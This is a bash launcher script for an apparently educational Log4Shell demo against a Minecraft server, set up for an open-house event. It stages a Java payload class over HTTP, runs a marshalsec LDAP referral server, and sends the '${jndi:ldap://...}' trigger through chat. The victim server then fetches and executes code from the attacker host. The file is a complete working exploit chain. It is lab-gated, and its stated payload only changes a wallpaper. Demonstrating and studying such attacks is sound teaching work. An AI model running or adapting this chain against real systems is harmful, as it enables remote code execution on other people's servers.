#!/usr/bin/env bash
# EHAX Open House - attacker-side demo launcher.
#
# Starts:
#   - HTTP server on :8000 serving the compiled benign class + wallpaper
#   - marshalsec LDAP referral server on :1389
#   - a minimal 1.8.8 chat sender (no Minecraft client/account needed)
#
# The victim Minecraft server must be started with:
#   EHAX_LAB=1
#   -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
#
# Usage:
#   ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20
#   ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --message '${jndi:ldap://10.10.10.10:1389/a}'
#   ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --no-chat
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
SERVE_DIR="$HERE/serve"
VENDOR_JAR="$HERE/vendor/marshalsec-0.0.3-SNAPSHOT-all.jar"
LOGS_DIR="$HERE/logs"
PYTHON_BIN="${PYTHON_BIN:-python3}"
JAVA_BIN="${JAVA_BIN:-java}"

IP=""
VICTIM="10.10.10.20"
MC_PORT="25565"
HTTP_PORT="8000"
LDAP_PORT="1389"
MESSAGE=""
NO_CHAT=0

usage() {
  cat <<'EOF'
EHAX Open House - attacker-side demo launcher.

Starts:
  - HTTP server on :8000 serving the compiled benign class + wallpaper
  - marshalsec LDAP referral server on :1389
  - a minimal 1.8.8 chat sender (no Minecraft client/account needed)

Usage:
  ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20
  ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --message '${jndi:ldap://10.10.10.10:1389/a}'
  ./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --no-chat

Options:
  --ip ADDR          attacker VM host-only IP (default: auto-detect)
  --victim ADDR      victim Minecraft IP (default: 10.10.10.20)
  --port PORT        Minecraft port (default: 25565)
  --http-port PORT   payload HTTP port (default: 8000)
  --ldap-port PORT   LDAP referral port (default: 1389)
  --message TEXT     send one message then keep servers up
  --no-chat          start servers only, no chat prompt
EOF
}

while [ $# -gt 0 ]; do
  case "$1" in
    --ip) IP="${2:-}"; shift 2 ;;
    --victim) VICTIM="${2:-}"; shift 2 ;;
    --port) MC_PORT="${2:-}"; shift 2 ;;
    --http-port) HTTP_PORT="${2:-}"; shift 2 ;;
    --ldap-port) LDAP_PORT="${2:-}"; shift 2 ;;
    --message) MESSAGE="${2:-}"; shift 2 ;;
    --no-chat) NO_CHAT=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) echo "Unknown argument: $1" >&2; usage; exit 1 ;;
  esac
done

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[-] Missing '$1'." >&2
    exit 1
  }
}

need "$PYTHON_BIN"
need "$JAVA_BIN"
need curl

if [ ! -f "$SERVE_DIR/WallpaperPayload.class" ] || [ ! -f "$SERVE_DIR/ehax-wallpaper.png" ]; then
  echo "[*] Payload not staged yet; building it..."
  "$HERE/build-payload.sh"
fi

if [ ! -f "$VENDOR_JAR" ]; then
  echo "[*] marshalsec jar missing; rebuilding..."
  "$HERE/build-payload.sh"
fi

detect_ip() {
  local candidate=""
  if command -v ipconfig >/dev/null 2>&1; then
    for iface in en0 en1 en2; do
      candidate="$(ipconfig getifaddr "$iface" 2>/dev/null || true)"
      if [ -n "$candidate" ]; then echo "$candidate"; return 0; fi
    done
  fi
  if command -v hostname >/dev/null 2>&1; then
    for candidate in $(hostname -I 2>/dev/null || true); do
      case "$candidate" in
        127.*|::1) continue ;;
        10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) echo "$candidate"; return 0 ;;
      esac
    done
  fi
  if command -v ip >/dev/null 2>&1; then
    candidate="$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for (i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')"
    if [ -n "$candidate" ]; then echo "$candidate"; return 0; fi
  fi
  return 1
}

if [ -z "$IP" ]; then
  if ! IP="$(detect_ip)"; then
    echo "[-] Could not auto-detect the attacker VM's lab IP." >&2
    echo "    Rerun with: --ip 10.10.10.10" >&2
    exit 1
  fi
  echo "[!] Auto-detected attacker IP: $IP"
  echo "    If your host-only network uses a different address, rerun with --ip <address>."
fi

# Important: single quotes keep ${...} literal for the Minecraft chat.
TRIGGER='${jndi:ldap://'"$IP:$LDAP_PORT"'/a}'

port_in_use() {
  "$PYTHON_BIN" - "$1" <<'PY'
import socket, sys
port = int(sys.argv[1])
s = socket.socket()
s.settimeout(0.4)
try:
    if s.connect_ex(("127.0.0.1", port)) == 0:
        sys.exit(0)
    sys.exit(1)
finally:
    s.close()
PY
}

for port in "$HTTP_PORT" "$LDAP_PORT"; do
  if port_in_use "$port"; then
    echo "[-] Port $port is already in use. Stop the old demo process or pass a different port." >&2
    exit 1
  fi
done

mkdir -p "$LOGS_DIR"
rm -f "$LOGS_DIR/http.log" "$LOGS_DIR/ldap.log"

HTTP_PID=""
LDAP_PID=""
cleanup() {
  trap - EXIT INT TERM
  echo
  echo "[*] Stopping demo servers..."
  [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null || true
  [ -n "$LDAP_PID" ] && kill "$LDAP_PID" 2>/dev/null || true
  wait 2>/dev/null || true
  exit 0
}
trap cleanup EXIT INT TERM

echo "[*] Serving payload over HTTP on 0.0.0.0:$HTTP_PORT"
"$PYTHON_BIN" -m http.server "$HTTP_PORT" --bind 0.0.0.0 --directory "$SERVE_DIR" \
  >"$LOGS_DIR/http.log" 2>&1 &
HTTP_PID=$!

echo "[*] Starting LDAP referral server on 0.0.0.0:$LDAP_PORT"
"$JAVA_BIN" -cp "$VENDOR_JAR" marshalsec.jndi.LDAPRefServer \
  "http://$IP:$HTTP_PORT/#WallpaperPayload" "$LDAP_PORT" \
  >"$LOGS_DIR/ldap.log" 2>&1 &
LDAP_PID=$!

# Wait for both sockets to accept connections.
for _ in $(seq 1 40); do
  if port_in_use "$HTTP_PORT" && port_in_use "$LDAP_PORT"; then
    break
  fi
  if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    echo "[-] HTTP server exited. See $LOGS_DIR/http.log" >&2
    cat "$LOGS_DIR/http.log" >&2 || true
    exit 1
  fi
  if ! kill -0 "$LDAP_PID" 2>/dev/null; then
    echo "[-] LDAP server exited. See $LOGS_DIR/ldap.log" >&2
    cat "$LOGS_DIR/ldap.log" >&2 || true
    exit 1
  fi
  sleep 0.25
done

if ! port_in_use "$HTTP_PORT" || ! port_in_use "$LDAP_PORT"; then
  echo "[-] Servers did not come up in time." >&2
  echo "--- http.log ---" >&2; cat "$LOGS_DIR/http.log" >&2 || true
  echo "--- ldap.log ---" >&2; cat "$LOGS_DIR/ldap.log" >&2 || true
  exit 1
fi

cat <<EOF

============================================================
  EHAX // LOG4SHELL DEMO - ATTACKER READY
============================================================
  Attacker IP : $IP
  Victim      : $VICTIM:$MC_PORT
  LDAP        : $IP:$LDAP_PORT
  HTTP        : http://$IP:$HTTP_PORT/
  Trigger     : $TRIGGER

  Victim server must have:
    EHAX_LAB=1
    -Dcom.sun.jndi.ldap.object.trustURLCodebase=true

  It must be started from the logged-in desktop session
  (not SSH/systemd) and the server console minimized so
  the victim wallpaper is visible.

  SAFETY: isolated host-only network only. Benign payload:
  it changes the wallpaper and writes a temp proof file.
============================================================

EOF

# Best-effort clipboard copy for the kid.
if command -v pbcopy >/dev/null 2>&1; then
  printf '%s' "$TRIGGER" | pbcopy 2>/dev/null || true
  echo "[*] Trigger copied to clipboard (macOS)."
elif command -v wl-copy >/dev/null 2>&1; then
  printf '%s' "$TRIGGER" | wl-copy 2>/dev/null || true
  echo "[*] Trigger copied to clipboard (Wayland)."
elif command -v xclip >/dev/null 2>&1; then
  printf '%s' "$TRIGGER" | xclip -selection clipboard 2>/dev/null || true
  echo "[*] Trigger copied to clipboard (X11)."
fi

if [ "$NO_CHAT" -eq 1 ]; then
  echo "[*] --no-chat: servers stay up. Press Ctrl-C to stop."
  while true; do sleep 1; done
fi

if [ -n "$MESSAGE" ]; then
  echo "[*] Sending one message to $VICTIM:$MC_PORT"
  "$PYTHON_BIN" "$HERE/chat-send.py" --host "$VICTIM" --port "$MC_PORT" \
    --message "$MESSAGE"
  echo "[*] Message sent. Servers stay up for the next batch; Ctrl-C to stop."
  while true; do sleep 1; done
fi

while true; do
  echo
  echo "Trigger for this station:"
  echo "  $TRIGGER"
  echo "Press Enter to send the trigger, or type another chat message."
  if ! IFS= read -r -p "> " typed; then
    break
  fi
  msg="${typed:-$TRIGGER}"
  if [[ "$msg" != *'${jndi:'* ]]; then
    echo "[!] Note: that message has no JNDI trigger, so it will not fire the demo."
  fi
  "$PYTHON_BIN" "$HERE/chat-send.py" --host "$VICTIM" --port "$MC_PORT" \
    --user "EHAX_Guest" --message "$msg" || true
  echo
  echo "[*] If the victim desktop is visible, the wallpaper should change now."
  if ! IFS= read -r -p "Send another message? [Y/n] " again; then
    break
  fi
  case "$again" in
    n|N|no|NO) break ;;
  esac
done

echo "[*] Done. Stopping servers."
